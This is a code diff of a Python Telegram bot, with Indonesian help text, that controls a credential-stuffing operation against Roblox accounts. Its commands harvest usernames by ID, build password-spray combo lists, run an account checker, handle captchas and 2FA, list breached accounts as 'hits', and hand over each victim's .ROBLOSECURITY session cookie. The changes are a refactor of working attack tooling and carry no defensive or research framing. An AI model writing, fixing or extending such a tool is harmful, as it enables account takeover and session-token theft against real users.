@@ -27,7 +27,7 @@ def tg(token, method, params=None, timeout=60):
 
 HELP = """svc
 /doctor - cek token, owner, IP, header, csrf, login
-/owner - lihat/set owner id
+/owner [id] - lihat/set owner
 /probe - cek endpoint & UA
 /capraw - dump header captcha mentah
 /cap [n] - status captcha + daftar
@@ -35,23 +35,16 @@ HELP = """svc
 /warm [token] - status warm / kirim token manual
 /retrycaptcha - balikin combo captcha ke antrian
 /retryinvalid - balikin combo 'soft' ke antrian
-/2fa <user> <kode> - selesain 2FA
 /soft - jumlah combo soft
+/2fa <user> <kode> - selesain 2FA
 /harvest [start] [count] - panen username by ID
 /users - jumlah akun terkumpul
 /gen spray|deep [pwlimit] [userlimit] [cap] - rakit combo
 /check on|off - mulai/stop checker
 /status - progress
-/hits [n] - daftar tembusan
-/hit <user> - detail satu akun
-/cookie <user> - token .ROBLOSECURITY
-/dead [n] - combo yang udah nyerah
-/retry - balikin combo dead ke pending
-/reset - balikin combo running ke pending
-/backup /restore - gist
-/pw [n] - contoh password list
-/log [n] - ekor log
-/update - git pull
+/hits [n] /hit <user> /cookie <user>
+/dead [n] /retry /reset
+/backup /restore /pw [n] /log [n] /update
 kirim file .txt - auto: ada ':' = combo, tanpa ':' = password
 kalau ada WARM NEEDED, balas tokennya langsung ke chat ini"""
 
@@ -103,9 +96,7 @@ class Bot:
     def handle(self, upd):
         m = upd.get("message") or {}
         chat = (m.get("chat") or {}).get("id")
-        if chat is None:
-            return
-        if (m.get("chat") or {}).get("type") != "private":
+        if chat is None or (m.get("chat") or {}).get("type") != "private":
             return
         if self.owner and chat != self.owner and not config.AUTO_OWNER:
             log.info("abaikan chat %s (owner %s)", chat, self.owner)
@@ -114,7 +105,7 @@ class Bot:
             self.set_owner(chat)
             self.send("owner di-set ke %s. kirim /help" % chat)
         elif chat != self.owner:
-            log.info("chat %s != owner %s (diterima karena AUTO_OWNER)", chat, self.owner)
+            log.info("chat %s != owner %s (AUTO_OWNER)", chat, self.owner)
         self.chat = chat
 
         if m.get("document"):
@@ -151,10 +142,9 @@ class Bot:
         elif c == "/probe":
             threading.Thread(target=lambda: self.send(probe.main()), daemon=True).start()
         elif c == "/cap":
-            n = int(arg[0]) if arg else 15
             self.send("captcha=%d rate=%.2f mode=%s\n%s" % (
                 store.captcha_count(), self.pool.captcha_rate(), self.pool.mode,
-                "\n".join(store.captcha_list(n)) or "-"))
+                "\n".join(store.captcha_list(int(arg[0]) if arg else 15)) or "-"))
         elif c == "/mode":
             v = (arg[0] if arg else "").lower()
             self.send("mode -> %s" % self.pool.set_mode(v) if v in ("auto", "blast")
@@ -229,10 +219,9 @@ class Bot:
         elif c == "/pw":
             self.send("\n".join(gencombo.load_passwords()[:int(arg[0]) if arg else 10]) or "kosong")
         elif c == "/log":
-            n = int(arg[0]) if arg else 40
             try:
                 with open(config.LOG_PATH, encoding="utf-8") as f:
-                    self.send("".join(f.readlines()[-n:])[-3800:] or "kosong")
+                    self.send("".join(f.readlines()[-int(arg[0]) if arg else -40:])[-3800:] or "kosong")
             except Exception as e:
                 self.send("log err: %r" % e)
         elif c == "/update":
